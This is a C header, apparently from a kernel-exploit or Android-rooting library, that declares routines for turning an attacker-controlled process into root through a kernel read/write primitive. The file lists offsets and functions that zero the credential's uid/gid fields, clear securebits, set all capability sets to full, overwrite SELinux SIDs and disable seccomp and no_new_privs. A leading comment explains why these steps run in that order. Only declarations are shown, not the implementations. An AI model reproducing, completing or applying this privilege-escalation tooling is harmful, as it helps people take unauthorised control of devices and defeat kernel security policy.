/* lib/root/cred.h -- making a credential privileged, over a read/write pair.
 *
 * Four changes, and the order is not arbitrary. Clear the eight identity words
 * so the kernel stops recognising the process as its original user. Clear the
 * secure bits, which would otherwise keep privileges from taking effect. Set
 * every capability set, then read them back -- a write that succeeded and a
 * write that took effect are different claims, and only the second matters.
 * Finally, defang the system-call filter, which is enforced independently of
 * identity and would otherwise still block the calls the privilege was acquired
 * for.
 *
 * The security label is a separate step, because a process can hold full
 * capabilities and still be confined by policy. It is passed in rather than
 * assumed: which label is unconfined is a property of the policy on the device,
 * not of this code.
 *
 * Every address is a linear-map alias; the caller resolves the records.
 * Offsets come from the target description.
 */
#ifndef LIB_ROOT_CRED_H
#define LIB_ROOT_CRED_H

#include "../rw/krw.h"

#ifndef CRED_UID_OFF
#define CRED_UID_OFF                  4
#endif
#ifndef CRED_SECUREBITS_OFF
#define CRED_SECUREBITS_OFF           36
#endif
#ifndef CRED_CAPS_OFF
#define CRED_CAPS_OFF                 40
#endif
#ifndef CRED_SECURITY_OFF
#define CRED_SECURITY_OFF             120
#endif
#ifndef SELINUX_CRED_OSID_OFF
#define SELINUX_CRED_OSID_OFF         0
#endif
#ifndef CRED_CAP_WORDS
#define CRED_CAP_WORDS                5
#endif
#ifndef CAP_FULL
#define CAP_FULL                      0x000001ffffffffffULL
#endif

#ifndef TASK_THREAD_INFO_FLAGS_OFF
#define TASK_THREAD_INFO_FLAGS_OFF    0x00
#endif
#ifndef TASK_ATOMIC_FLAGS_OFF
#define TASK_ATOMIC_FLAGS_OFF         0x5f0
#endif
#ifndef TASK_SECCOMP_OFF
#define TASK_SECCOMP_OFF              0x900
#endif
#ifndef SECCOMP_MODE_OFF
#define SECCOMP_MODE_OFF              0x00
#endif
#ifndef SECCOMP_FILTER_COUNT_OFF
#define SECCOMP_FILTER_COUNT_OFF      0x04
#endif
#ifndef SECCOMP_FILTER_OFF
#define SECCOMP_FILTER_OFF            0x08
#endif
#ifndef TIF_SECCOMP_BIT
#define TIF_SECCOMP_BIT               11
#endif
#ifndef PFA_NO_NEW_PRIVS_BIT
#define PFA_NO_NEW_PRIVS_BIT          0
#endif

/* Zero the uid/gid ids, clear securebits, set all five capability sets to
 * CAP_FULL and verify. Returns 1 on success, 0 on failure. */
int lib_patch_cred_identity(const struct krw *rw, kdirect_t cred);

/* Overwrite the SELinux (osid,sid) pair in the cred's security blob.
 * `blob_off` is selinux_blob_sizes.lbs_cred (read from SELINUX_BLOB_SIZES).
 * Returns 1 on success, 0 on failure. */
int lib_patch_cred_sid(
    const struct krw *rw, kdirect_t cred, uint32_t osid, uint32_t sid,
    uint32_t blob_off);

/* identity + sid together. */
int lib_patch_cred_object(
    const struct krw *rw, kdirect_t cred, uint32_t osid, uint32_t sid,
    uint32_t blob_off);

/* Clear TIF_SECCOMP, no_new_privs and the task's seccomp mode/filter.
 * Returns 1 on success (verified), 0 on failure. */
int lib_patch_task_seccomp(const struct krw *rw, kdirect_t task);

#endif /* LIB_ROOT_CRED_H */
